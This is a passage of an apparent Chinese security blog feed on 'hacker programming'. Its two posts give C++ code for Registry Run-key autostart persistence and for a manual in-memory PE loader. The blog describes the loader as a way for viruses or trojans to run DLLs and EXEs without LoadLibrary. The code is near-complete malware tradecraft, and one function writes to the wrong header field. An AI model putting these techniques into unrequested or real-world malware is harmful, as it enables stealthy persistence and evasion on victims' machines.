class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Register</span><span class="params">(<span class="keyword">char</span>* lpszFileName, <span class="keyword">char</span>* lpszValueName)</span> </span>&#123;</span><br><span class="line">    HKEY hKey;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE, <span class="string">&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>, <span class="number">0</span>, KEY_WRITE, &amp;hKey) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;打开注册表失败\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegSetValueEx</span>(hKey, lpszValueName, <span class="number">0</span>, REG_SZ, (BYTE*)lpszFileName, (<span class="built_in">lstrlen</span>(lpszFileName) + <span class="number">1</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;设置注册表值失败\n&quot;</span>);</span><br><span class="line">        <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Register</span>(<span class="string">&quot;C:\\Users\\b1ackie\\Desktop\\Register.exe&quot;</span>, <span class="string">&quot;b1ackie&quot;</span>) == FALSE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;自启动失败\n&quot;</span>);</span><br><span class="line">        <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;自启动成功\n&quot;</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打开程序，提示自启动成功，说明注册表设置成功。</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/1.png"></p><p>用regedit命令查看注册表相关信息，可以成功看到当前的注册表信息，注意图中路径的不同，这是因为重定位的原因。</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/2.png"></p><p>也可以使用火绒剑，如图可以看到启动项的信息，现在重启计算机，就会自动启动了。</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/3.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;注册表方式实现自启动&quot;&gt;&lt;a href=&quot;#注册表方式实现自启动&quot; class=&quot;headerlink&quot; title=&quot;注册表方式实现自启动&quot;&gt;&lt;/a&gt;注册表方式实现自启动&lt;/h4&gt;&lt;p&gt;实现开机自启动的方式有很多，其中修改注册表的方式是最为广泛的。&lt;/p&gt;
&lt;h</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="自启动技术" scheme="https://b1ack1e.github.io/tags/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>内存直接加载运行</title>
    <link href="https://b1ack1e.github.io/2021/07/15/%E5%86%85%E5%AD%98%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E8%BF%90%E8%A1%8C/"/>
    <id>https://b1ack1e.github.io/2021/07/15/%E5%86%85%E5%AD%98%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E8%BF%90%E8%A1%8C/</id>
    <published>2021-07-15T06:28:21.000Z</published>
    <updated>2021-07-19T06:10:03.727Z</updated>
    
    <content type="html"><![CDATA[<h4 id="内存直接加载运行"><a href="#内存直接加载运行" class="headerlink" title="内存直接加载运行"></a>内存直接加载运行</h4><p>内存直接加载运行就是，模拟PE加载器的功能，把DLL或者exe等PE文件从内存中直接加载到病毒木马的内存中去运行，不需要通过loadlibrary等现成的API函数去操作。</p><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>构造一个PE装载器，将PE文件加载到内存中。大致过程，首先要申请一块内存，然后将PE文件按照映像对齐大小映射到内存中；根据重定位表，重定位硬编码数据；获取导入表中的函数及其地址；如果是DLL，获取导出表的相关数据（EXE一般没有导出表）；获取入口点的地址，若为EXE，直接跳到入口点即可执行，DLL文件的话还需要构造一个DLLMAIN函数，实现DLL加载。</p><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><p>打开文件并且获取大小</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* FileName = <span class="string">&quot;C:\\Users\\Tophanter\\Desktop\\TestDll.dll&quot;</span>;</span><br><span class="line"><span class="comment">//打开文件</span></span><br><span class="line">HANDLE hFile = <span class="built_in">CreateFileA</span>(FileName, GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="literal">NULL</span>, OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_ARCHIVE, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//获取大小</span></span><br><span class="line">DWORD dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//申请内存空间</span></span><br><span class="line">PBYTE pData = <span class="keyword">new</span> BYTE[dwFileSize];</span><br><span class="line">DWORD dwRet = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//将文件读取到内存中</span></span><br><span class="line"><span class="built_in">ReadFile</span>(hFile, pData, dwFileSize, &amp;dwRet, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hFile);</span><br></pre></td></tr></table></figure><h5 id="获取sizeofimage"><a href="#获取sizeofimage" class="headerlink" title="获取sizeofimage"></a>获取sizeofimage</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*获取PE文件的镜像大小，获取加载到内存后的大小</span></span><br><span class="line"><span class="comment">* lpData内存中的基址</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">DWORD <span class="title">GetImageSize</span><span class="params">(LPVOID lpData)</span> </span>&#123;</span><br><span class="line">DWORD dwSizeOfImage = <span class="number">0</span>;</span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpData;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">dwSizeOfImage = pNtHeaders-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line"><span class="keyword">return</span> dwSizeOfImage;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据获取的sizeofimage，在进程中开辟一个内存块，权限可读可写可执行。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LPVOID lpBaseAddr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">RtlZeroMemory</span>(lpBaseAddr, dwImageSize);</span><br></pre></td></tr></table></figure><h5 id="重定位数据"><a href="#重定位数据" class="headerlink" title="重定位数据"></a>重定位数据</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*获取重定位表的相关数据并且重定位数据</span></span><br><span class="line"><span class="comment">* lpBaseAddr: 内存PE数据按SectionAlignment大小对齐映射到进程内存中的内存基址</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">BOOL <span class="title">DoRelocationTable</span><span class="params">(LPVOID lpBaseAddr)</span> </span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line"><span class="comment">//获取重定位表</span></span><br><span class="line">PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((<span class="keyword">unsigned</span> <span class="keyword">long</span>)pDosHeader +</span><br><span class="line">pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);</span><br><span class="line"><span class="keyword">if</span> ((PVOID)pReloc == (PVOID)pDosHeader) &#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//开始扫描重定位表</span></span><br><span class="line"><span class="keyword">while</span> ((pReloc-&gt;VirtualAddress + pReloc-&gt;SizeOfBlock) != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">//重定位表的头部加上sizeof(IMAGE_BASE_RELOCATION)就是重定位数据的开始</span></span><br><span class="line">WORD* pRelocData = (WORD*)((PBYTE)pReloc + <span class="keyword">sizeof</span>(IMAGE_BASE_RELOCATION));</span><br><span class="line"><span class="comment">//获取需要重定位的数据的个数</span></span><br><span class="line"><span class="keyword">int</span> nNumberOfReloc = (pReloc-&gt;SizeOfBlock - <span class="keyword">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="keyword">sizeof</span>(WORD);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nNumberOfReloc; i++) &#123;</span><br><span class="line">            <span class="comment">//高位是否为3，判断是否需要修复</span></span><br><span class="line"><span class="keyword">if</span> ((DWORD)(pRelocData[i] &amp; <span class="number">0x0000F000</span>) == <span class="number">0x00003000</span>) &#123; </span><br><span class="line"><span class="comment">//获取需要重定位数据的地址</span></span><br><span class="line">DWORD* pAddress = (DWORD*)((PBYTE)pDosHeader + pReloc-&gt;VirtualAddress + (pRelocData[i] &amp; <span class="number">0x0FFF</span>));</span><br><span class="line"><span class="comment">//修改重定位数据，公式：地址-旧基址+新基址，地址是pAddress中的值</span></span><br><span class="line">DWORD dwDelta = (DWORD)pDosHeader - pNtHeaders-&gt;OptionalHeader.ImageBase;</span><br><span class="line">*pAddress += dwDelta;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//继续处理下一组重定位数据</span></span><br><span class="line">pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc-&gt;SizeOfBlock);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*获取导入表的相关数据</span></span><br><span class="line"><span class="comment">* lpBaseAddr: 内存PE数据按SectionAlignment大小对齐映射到进程内存中的内存基址</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">BOOL <span class="title">DoImportTable</span><span class="params">(LPVOID lpBaseAddr)</span> </span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line"><span class="comment">//获取导入表地址</span></span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR pImportTable = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)pDosHeader +</span><br><span class="line">pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);</span><br><span class="line"><span class="comment">// 循环遍历导入表中的DLL及获取导入表中的函数地址</span></span><br><span class="line"><span class="keyword">char</span>* lpDllName = <span class="literal">NULL</span>;</span><br><span class="line">HMODULE hDll = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_THUNK_DATA lpImportNameArray = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_IMPORT_BY_NAME lpImportByName = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_THUNK_DATA lpImportFuncAddrArray = <span class="literal">NULL</span>;</span><br><span class="line">FARPROC lpFuncAddress = <span class="literal">NULL</span>;</span><br><span class="line">DWORD i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == pImportTable-&gt;OriginalFirstThunk) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取导入表中DLL的名称并加载DLL</span></span><br><span class="line">lpDllName = (<span class="keyword">char</span>*)((DWORD)pDosHeader + pImportTable-&gt;Name);</span><br><span class="line">hDll = <span class="built_in">GetModuleHandleA</span>(lpDllName);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == hDll) &#123;</span><br><span class="line">hDll = <span class="built_in">LoadLibraryA</span>(lpDllName);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == hDll) &#123;</span><br><span class="line">pImportTable++;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 获取OriginalFirstThunk以及对应的导入函数名称表首地址</span></span><br><span class="line">lpImportNameArray = (PIMAGE_THUNK_DATA)((DWORD)pDosHeader + pImportTable-&gt;OriginalFirstThunk);</span><br><span class="line"><span class="comment">// 获取FirstThunk以及对应的导入函数地址表首地址</span></span><br><span class="line">lpImportFuncAddrArray = (PIMAGE_THUNK_DATA)((DWORD)pDosHeader + pImportTable-&gt;FirstThunk);</span><br><span class="line"><span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == lpImportNameArray[i].u1.AddressOfData) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取IMAGE_IMPORT_BY_NAME结构</span></span><br><span class="line">lpImportByName = (PIMAGE_IMPORT_BY_NAME)((DWORD)pDosHeader + lpImportNameArray[i].u1.AddressOfData);</span><br><span class="line"><span class="comment">// 判断导出函数是序号导出还是函数名称导出</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0x80000000</span> &amp; lpImportNameArray[i].u1.Ordinal) &#123;</span><br><span class="line"><span class="comment">// 序号导出</span></span><br><span class="line"><span class="comment">// 当IMAGE_THUNK_DATA值的最高位为1时，表示函数以序号方式输入，这时，低位被看做是一个函数序号</span></span><br><span class="line">lpFuncAddress = <span class="built_in">GetProcAddress</span>(hDll, (LPCSTR)(lpImportNameArray[i].u1.Ordinal &amp; <span class="number">0x0000FFFF</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// 名称导出</span></span><br><span class="line">lpFuncAddress = <span class="built_in">GetProcAddress</span>(hDll, (LPCSTR)lpImportByName-&gt;Name);</span><br><span class="line">&#125;</span><br><span class="line">lpImportFuncAddrArray[i].u1.Function = (DWORD)lpFuncAddress;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line">pImportTable++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="修改ImageBase"><a href="#修改ImageBase" class="headerlink" title="修改ImageBase"></a>修改ImageBase</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修改ImageBase</span></span><br><span class="line"><span class="function">BOOL <span class="title">SetImage</span><span class="params">(LPVOID lpBaseAddr)</span> </span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">pNtHeaders-&gt;OptionalHeader.SizeOfImage = (ULONG32)lpBaseAddr;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="获取入口点"><a href="#获取入口点" class="headerlink" title="获取入口点"></a>获取入口点</h5><p>如果是EXE，这一步，获取addressOfEntryPoint之后跳到入口点即可直接执行。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">Entry</span><span class="params">(LPVOID lpBaseAddr)</span> </span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">LPVOID Entry = (LPVOID)((ULONG32)pDosHeader + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">__asm &#123;</span><br><span class="line">mov eax,Entry</span><br><span class="line">jmp eax</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在来测试一下直接运行一个EXE，测试文件为桌面上的TestProcess.exe。源代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b1ackie!!!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行程序查看效果，可以看到直接加载运行TestProcess.exe。</p><p><img src="/2021/07/15/%E5%86%85%E5%AD%98%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E8%BF%90%E8%A1%8C/1.png"></p><p>若是DLL文件，还需要构造一下DLLMAIN</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CallDllMain</span><span class="params">(LPVOID lpBaseAddr)</span> </span>&#123;</span><br><span class="line">typedef_DllMain DllMain = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">DllMain = (typedef_DllMain)((ULONG32)pDosHeader + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">BOOL bRet = <span class="built_in">DllMain</span>((HINSTANCE)lpBaseAddr,DLL_PROCESS_ATTACH,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (bRet == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;构造入口点失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*获取导出函数及其地址</span></span><br><span class="line"><span class="comment">* lpBaseAddr: 内存PE数据按SectionAlignment大小对齐映射到进程内存中的内存基址</span></span><br><span class="line"><span class="comment">* lpszFuncName：导出函数名字</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">LPVOID <span class="title">GetExFuncAddr</span><span class="params">(LPVOID lpBaseAddr,<span class="keyword">char</span>* lpszFuncName)</span> </span>&#123;</span><br><span class="line">LPVOID lpFunc = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line"><span class="comment">//获取导出表地址</span></span><br><span class="line">PIMAGE_EXPORT_DIRECTORY pExportTable = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader + </span><br><span class="line">pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line"><span class="comment">//从导出表取出的函数名</span></span><br><span class="line"><span class="keyword">char</span>* lpFuncName = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//获取AddressOfNames</span></span><br><span class="line">PDWORD lpAddressOfNamesArray = (PDWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfNames);</span><br><span class="line"><span class="comment">//获取AddressOfNameOrdinals</span></span><br><span class="line">PWORD lpAddressOfNameOrdinalArray = (PWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfNameOrdinals);</span><br><span class="line"><span class="comment">//索引值</span></span><br><span class="line">WORD wHint = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//获取AddressOfFunctions</span></span><br><span class="line">PDWORD lpAddressOfFuncArray = (PDWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfFunctions);</span><br><span class="line"><span class="comment">//获取所有根据名称导出的函数数量</span></span><br><span class="line">DWORD dwNumberOfNames = pExportTable-&gt;NumberOfNames;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dwNumberOfNames; i++) &#123;</span><br><span class="line">lpFuncName = (PCHAR)((DWORD)pDosHeader + lpAddressOfNamesArray[i]);</span><br><span class="line"><span class="keyword">if</span> (strcmpi(lpFuncName, lpszFuncName) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">//获取索引值</span></span><br><span class="line">wHint = lpAddressOfNameOrdinalArray[i];</span><br><span class="line"><span class="comment">//根据索引值，在AddressOfFunctions中取出RVA</span></span><br><span class="line">lpFunc = (LPVOID)((DWORD)pDosHeader + lpAddressOfFuncArray[wHint]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回函数地址</span></span><br><span class="line"><span class="keyword">return</span> lpFunc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行加载桌面上的TestDll.dll文件，此DLL导出函数是一个messagebox函数。</p><p><img src="/2021/07/15/%E5%86%85%E5%AD%98%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E8%BF%90%E8%A1%8C/2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;内存直接加载运行&quot;&gt;&lt;a href=&quot;#内存直接加载运行&quot; class=&quot;headerlink&quot; title=&quot;内存直接加载运行&quot;&gt;&lt;/a&gt;内存直接加载运行&lt;/h4&gt;&lt;p&gt;内存直接加载运行就是，模拟PE加载器的功能，把DLL或者exe等PE文件从内存中直接加载到病</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="启动技术" scheme="https://b1ack1e.github.io/tags/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"/>
    
